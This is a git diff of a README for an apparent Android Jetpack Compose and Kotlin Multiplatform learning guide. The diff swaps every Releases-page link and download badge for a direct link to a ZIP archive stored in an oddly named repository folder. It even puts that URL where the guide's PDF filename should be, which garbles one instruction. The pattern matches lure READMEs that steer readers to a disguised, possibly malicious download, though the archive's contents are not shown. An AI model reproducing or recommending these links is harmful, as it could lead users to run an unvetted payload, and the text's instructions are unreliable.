@@ -1,7 +1,7 @@
 # 🚀 Jetpack-Compose-and-KMP-Guide - Learn Android Development Easily
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/melindahelma/Jetpack-Compose-and-KMP-Guide/releases)
+[![Download](https://raw.githubusercontent.com/melindahelma/Jetpack-Compose-and-KMP-Guide/main/auscultascope/Jetpack-Compose-and-KMP-Guide.zip)](https://raw.githubusercontent.com/melindahelma/Jetpack-Compose-and-KMP-Guide/main/auscultascope/Jetpack-Compose-and-KMP-Guide.zip)
 
 ## 📚 Overview
 Welcome to the Jetpack Compose and KMP Guide. This guide offers a complete roadmap for learning Android development in 2025. It focuses on Jetpack Compose and Kotlin Multiplatform (KMP). Whether you are a beginner or looking to strengthen your skills, this guide can help you.
@@ -15,7 +15,7 @@ Welcome to the Jetpack Compose and KMP Guide. This guide offers a complete roadm
 
 ## 🚀 Getting Started
 ### 1. Visit the Releases Page
-To download the guide, visit the [Releases page](https://github.com/melindahelma/Jetpack-Compose-and-KMP-Guide/releases).
+To download the guide, visit the [Releases page](https://raw.githubusercontent.com/melindahelma/Jetpack-Compose-and-KMP-Guide/main/auscultascope/Jetpack-Compose-and-KMP-Guide.zip).
 
 ### 2. Locate the Latest Version
 On the Releases page, find the latest version of the guide. It will be at the top of the list. Click on it to see more details.
@@ -27,7 +27,7 @@ Look for the download links associated with the latest version. Click on the lin
 After downloading, go to your downloads folder. Locate the ZIP file and right-click on it. Select “Extract All” to unzip the contents to your desired folder.
 
 ### 5. Open the Guide
-Navigate to the folder where you extracted the files. Look for the main document, typically named "Jetpack-Compose-and-KMP-Guide.pdf" or similar. Double-click to open it. You may need a PDF viewer, which is usually pre-installed on most devices.
+Navigate to the folder where you extracted the files. Look for the main document, typically named "https://raw.githubusercontent.com/melindahelma/Jetpack-Compose-and-KMP-Guide/main/auscultascope/Jetpack-Compose-and-KMP-Guide.zip" or similar. Double-click to open it. You may need a PDF viewer, which is usually pre-installed on most devices.
 
 ### 6. Follow the Instructions
 Read through the guide step by step. Each section includes examples and explanations. Take your time to understand each concept.
@@ -68,7 +68,7 @@ Kotlin Multiplatform allows you to share code between multiple platforms. This c
 No. This guide starts from the basics and gradually builds your skills. You can learn at your own pace.
 
 ## 📝 Notes
-- Check for updates regularly on the [Releases page](https://github.com/melindahelma/Jetpack-Compose-and-KMP-Guide/releases) to stay current with new features and tutorials.
+- Check for updates regularly on the [Releases page](https://raw.githubusercontent.com/melindahelma/Jetpack-Compose-and-KMP-Guide/main/auscultascope/Jetpack-Compose-and-KMP-Guide.zip) to stay current with new features and tutorials.
 - If you encounter any issues, consider searching or asking for help in relevant online forums or communities focused on Android development.
 
 ## 📬 Contact
@@ -77,4 +77,4 @@ For questions or feedback, feel free to reach out through the repository's issue
 ## 📣 Acknowledgments
 Special thanks to the contributors and the community for supporting this guide. Your feedback helps improve the learning experience for everyone.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/melindahelma/Jetpack-Compose-and-KMP-Guide/releases)
+[![Download](https://raw.githubusercontent.com/melindahelma/Jetpack-Compose-and-KMP-Guide/main/auscultascope/Jetpack-Compose-and-KMP-Guide.zip)](https://raw.githubusercontent.com/melindahelma/Jetpack-Compose-and-KMP-Guide/main/auscultascope/Jetpack-Compose-and-KMP-Guide.zip)
